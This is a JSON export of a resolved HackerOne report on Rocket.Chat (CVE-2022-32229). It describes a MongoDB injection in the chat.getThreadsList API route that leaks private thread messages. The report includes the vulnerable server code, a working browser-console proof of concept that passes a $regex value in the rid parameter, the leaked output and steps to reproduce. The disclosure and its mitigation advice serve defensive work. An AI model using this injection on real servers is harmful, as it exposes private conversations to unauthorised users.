{
  "id": 1446767,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ2NzY3",
  "url": "https://hackerone.com/reports/1446767",
  "title": "API route chat.getThreadsList leaks private message content",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2022-01-11T13:21:40.696Z",
  "submitted_at": "2022-01-11T13:21:40.749Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gronke",
    "url": "/gronke",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 19858,
    "url": "https://hackerone.com/rocket_chat",
    "handle": "rocket_chat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Rocket.Chat",
      "twitter_handle": "RocketChat",
      "website": "https://rocket.chat",
      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [
    "CVE-2022-32229"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-09-22T16:03:36.155Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-09-22T12:21:27.196Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-10-22T12:21:27.288Z",
  "allow_singular_disclosure_after": -41392812.63179191,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "shreyaschavhan",
    "shivammusic",
    "hasansaikat"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 194886,
      "category": "team",
      "content": "## Summary\n\nThe `/api/v1/chat.getThreadsList` does not sanitize user inputs and can therefore leak private thread messages to unauthorized users via Mongo DB injection.\n\n## Description\n\nThe `chat.getThreadsList` API route is defined in [app/api/server/v1/chat.js#L522-L572](https://github.com/RocketChat/Rocket.Chat/blob/50d55d7a11c35893483b5561131486bd8b6bad7f/app/api/server/v1/chat.js#L522-L572):\n\n```javascript\nconst { rid, type, text } = this.queryParams;\nconst { offset, count } = this.getPaginationItems();\nconst { sort, fields, query } = this.parseJsonQuery();\n\nif (!rid) {\n\tthrow new Meteor.Error('The required \"rid\" query param is missing.');\n}\nif (!settings.get('Threads_enabled')) {\n\tthrow new Meteor.Error('error-not-allowed', 'Threads Disabled');\n}\nconst user = Users.findOneById(this.userId, { fields: { _id: 1 } });\nconst room = Rooms.findOneById(rid, { fields: { t: 1, _id: 1 } });\nif (!canAccessRoom(room, user)) {\n\tthrow new Meteor.Error('error-not-allowed', 'Not Allowed');\n}\n\nconst typeThread = {\n\t_hidden: { $ne: true },\n\t...(type === 'following' && { replies: { $in: [this.userId] } }),\n\t...(type === 'unread' && {\n\t\t_id: { $in: Subscriptions.findOneByRoomIdAndUserId(room._id, user._id).tunread },\n\t}),\n\tmsg: new RegExp(escapeRegExp(text), 'i'),\n};\n\nconst threadQuery = { ...query, ...typeThread, rid, tcount: { $exists: true } };\nconst cursor = Messages.find(threadQuery, {\n\tsort: sort || { tlm: -1 },\n\tskip: offset,\n\tlimit: count,\n\tfields,\n});\n\nconst total = cursor.count();\n\nconst threads = cursor.fetch();\n\nreturn API.v1.success({\n\tthreads,\n\tcount: threads.length,\n\toffset,\n\ttotal,\n});\n```\n\nClients can provide JSON data in Query Parameters:\n\n```javascript\nconst { rid, type, text } = this.queryParams;\n```\n\nThe ACL check is performed against the first room returned by Mongo DB:\n\n```javascript\nconst room = Rooms.findOneById(rid, { fields: { t: 1, _id: 1 } });\nif (!canAccessRoom(room, user)) {\n\tthrow new Meteor.Error('error-not-allowed', 'Not Allowed');\n}\n```\n\nAfter the access permission check, the original `rid` parameter is again provided as Mongo DB query input, but unlike the ACL check can return multiple results:\n\n```javascript\nconst threadQuery = { ...query, ...typeThread, rid, tcount: { $exists: true } };\nconst cursor = Messages.find(threadQuery, {\n\tsort: sort || { tlm: -1 },\n\tskip: offset,\n\tlimit: count,\n\tfields,\n});\n```\n\nAn authenticated adversary can provide an input that matches to multiple rooms of which the first match can be read by the malicious user. MongoDB will return the results in storage order, so that the channel that passes the ACL check must have been created before the target. For demonstration purposes the `GENERAL` channel was used:\n\n```javascript\nconst TARGET_ROOM = \"<ROOM_ID>\";\n\nconst fetchApi = async (url, options = {}) => {\n\treturn fetch(`/api/v1/${url}`, {\n\t\t...options,\n\t\theaders: {\n\t\t\t'X-User-Id': Meteor._localStorage.getItem(Accounts.USER_ID_KEY),\n\t\t\t'X-Auth-Token': Meteor._localStorage.getItem(Accounts.LOGIN_TOKEN_KEY),\n\t\t\t'Content-Type': 'application/json',\n\t\t\t...(options.headers || {})\n\t\t}\n\t}).then((res) => res.json())\n\t.then((data) => { console.log(data); return data; });\n};\n\nfetchApi(\"chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM}\").then(console.log)\n```\n\nThe object printed to the console has the secret message included in the `threads` property:\n\n```json\n{\n    \"threads\": [\n        {\n            \"_id\": \"7sJLzbjDL7iL56Lmc\",\n            \"rid\": \"YkJAwxJHe5t7BWimY\",\n            \"msg\": \"secret message\",\n            \"ts\": \"2022-01-11T12:26:20.603Z\",\n            \"u\": {\n                \"_id\": \"kYfzDMQLyPFjS9ASb\",\n                \"username\": \"gronke\",\n                \"name\": \"gronke\"\n            },\n            \"urls\": [],\n            \"mentions\": [],\n            \"channels\": [],\n            \"md\": [\n                {\n                    \"type\": \"PARAGRAPH\",\n                    \"value\": [\n                        {\n                            \"type\": \"PLAIN_TEXT\",\n                            \"value\": \"secret message\"\n                        }\n                    ]\n                }\n            ],\n            \"_updatedAt\": \"2022-01-11T12:45:40.086Z\",\n            \"replies\": [\n                \"kYfzDMQLyPFjS9ASb\"\n            ],\n            \"tcount\": 1,\n            \"tlm\": \"2022-01-11T12:45:39.971Z\"\n        }\n    ],\n    \"count\": 1,\n    \"offset\": 0,\n    \"total\": 1,\n    \"success\": true\n}\n```\n\nFor comparison it is not allowed to read the message directly:\n\n```javascript\n>>> Meteor.call(\"getMessages\", [\"7sJLzbjDL7iL56Lmc\"], console.log)\n{\n    \"isClientSafe\": true,\n    \"error\": \"error-not-allowed\",\n    \"reason\": \"Not allowed\",\n    \"details\": {\n        \"method\": \"getSingleMessage\"\n    },\n    \"message\": \"Not allowed [error-not-allowed]\",\n    \"errorType\": \"Meteor.Error\"\n}\n```\n\n## Releases Affected:\n\n  * develop\n\nThe change was introduced in [#7632f12c](https://github.com/RocketChat/Rocket.Chat/commit/7632f12cfcc7ed8ee8f843587fdff63b101cc765) and did not land in a release yet. Previous versions appear to be affected in a similar way, but within the `query` parameter instead of `rid`.\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create a thread in a private room between users Alice and Bob\n  2. Login as Trudy\n  3. Leak Alice and Bobs private Room ID (not discussed here)\n  4. Query `/api/v1/chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM_ID}`\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Suggested mitigation\n\n  * Strictly verify input parameter type.\n  * Use the ROOM ID returned for ACL verification in the final query.\n\n## Impact\n\nAuthenticated users can leak thread messages from private rooms they should not have access to.\n\n## Fix\n\nFixed in version 5.0>",
      "user": {
        "id": 1989106,
        "username": "mrd0d",
        "name": "Offsec team engineer",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2021-09-27T20:52:41.370Z",
        "url": "https://hackerone.com/mrd0d",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=574ef5615a2424f425ec7b5d264ae30080dd75368eb4308234bb56533354e5b6",
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=857e127783d660e3390c858ea449f433b4419c9f7a6f821f189f6a8e1840c9de",
          "xtralarge": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/d7b0d969b6320751e1c58b9e3efff1e228054ee3d8eade5c51c4c79b25513a9c?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1655cc18826717c1b54bf09e7aecc322cb31c2dc396a1ef91ae208d9c68c5168"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
